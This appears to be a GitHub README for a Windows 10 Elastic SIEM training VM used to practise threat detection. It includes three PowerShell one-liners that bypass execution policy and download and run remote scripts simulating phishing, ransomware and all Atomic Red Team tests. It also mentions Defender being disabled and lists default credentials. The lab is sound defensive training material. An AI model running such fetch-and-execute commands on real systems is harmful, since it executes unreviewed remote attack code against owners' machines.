

<img src="https://logodix.com/logo/1687834.png" width=75% height=75%>


# Elastic_Lab VM

Enchance your analysis, detection and threat hunting skills in an Elastic focused enviroment. A windows 10 based VM backed with ElasticSearch, Kibana and Loaded with AtomicRedTeam as well as custom red team scenario scripts.

## Test, Detect and Understand

### Test
  
Test your team on there Blue team skills, Running AtomicRedTeam scripts against the enviroment or even try hack the VM within your own network.

### Detect
  
Utalising Elastic SIEM and Endpoint Secuirty to Detect as many TTPs by creating your own custom rule set or implement Elastics own rule set.

### Understand
  
With the Elastic agent ingesting Sysmon, Powershell, wineventlogs, Endpoint Monitoring and Network traffic logs, deep dive and conduct full analysis recognising any IOCs.  
   
### Download

[Elastic_Lab.zip](https://mega.nz/file/OnhVybAJ#skZQ8ts4-PLVU_RLYg4f_YXC8iNUqWC7S3Wmcptd2u0)
  
-------------------  
  
### Remember

:warning: Elastic Services can take up to 5 minutes to load.  
  
:warning: Microsoft defender is deactivated and Elastic Agent acts as the primary AV, detecting threats not preventing them.  
  
:warning: Ensure you create a snapshot prior to starting the machine for the first time, allowing you to revert to a clean image prior to further red team engagments.

:warning: On start up the Elastic Agent and Fleet Server need to align, sometimes it may require a manual restart.  
  
Open Kibana and search for fleet managment.  

<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/fleet_server1.png" width=75% height=75%>  

if it shows that the agent is offline / unhealhy you will need to restart the agent by running the `Restart_Elastic_Agent.bat` as administrator.  
  
<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/fleet_server2.png" width=75% height=75%>  
  
-------------------  
   
### Red Team Scenarios
  
Open Powershell as `Administrator` and execute the code below. 
This will generate logs and alerts within Kibana. 
Depening on the scenario the powershell scripts can take from 5 - 30 minutes to execute.  
When you what to reset the VM or clean up after the attack just select the restart snapshot.

#### :fishing_pole_and_fish: Phishing :fishing_pole_and_fish: ####

```
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Phish.ps1')"
```
  
#### :collision: Ransomware  :collision: ####

```
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Ransom.ps1')"
```
  
#### :see_no_evil: Execute all atomic red team scripts :see_no_evil: ####
  
```
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/AtomicRedTeam_All.ps1')"
```  
-------------------  
  
<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/Elastic_homescreen.png" width=75% height=75%>  
  
<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/discover.png" width=75% height=75%>  
  
<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/security.png" width=75% height=75%>  
  
-------------------  

## Intergrations
<details>
  <summary>Elastic Agent intergrations</summary>
  <img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/intergrations.png" width=50% height=50%> 
  
</details>


## Data Streams

<details>
  <summary>Elastic Agent</summary>
  
  -------------------  
  
  * elastic_agent
  * elastic_agent.endpoint_security
  * elastic_agent.filebeat
  * elastic_agent.fleet_server
  * elastic_agent.metricbeat
  * elastic_agent.packetbeat
  
  -------------------  
  
  
</details>

<details>
  <summary>Endpoint Security</summary>
  
  -------------------  
  
  * endpoint.events.file
  * endpoint.events.security
  * endpoint.events.network
  * endpoint.events.registry
  
  -------------------  
  
  
</details>

<details>
  <summary>Network Traffic</summary>
  
  -------------------  
  
  * network_traffic.dhcpv4
  * network_traffic.dns
  * network_traffic.flow
  * network_traffic.http
  * network_traffic.icmp
  * network_traffic.tls
  
  -------------------  
  
</details>

<details>
  <summary>System / Sysmon  </summary>
  
  -------------------  
  
  Sysmon Configuration  
  [olafhartong Sysmon config](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml)  
  
  -------------------  
  
  * system.application
  * system.security
  * system.system
  * windows.sysmon_operational  
  
  -------------------  
  
  
</details>

<details>
  <summary>Threat Intel</summary>  
  
  -------------------  
  
  * ti_abusech.malware
  * ti_abusech.malwarebazaar
  * ti_abusech.url
  
  -------------------  
  
</details>

### VM Credentials

**Windows 10 Login**  
> **User:**     Elastic    
> **pass:**     elastic  

**Elastic login**   
> **User:**   elastic  
> **pass:**   elastic  


## VM Minimum Requiments

* 8 GB RAM
* 4 CPU
* 60GB Storage

### VM Specs

* Windows 10 (unlicensed)
* Elastic Agent 8.6.1
* ElasticSearch 8.6.1
* Kibana 8.6.1
* AtomicRedTeam










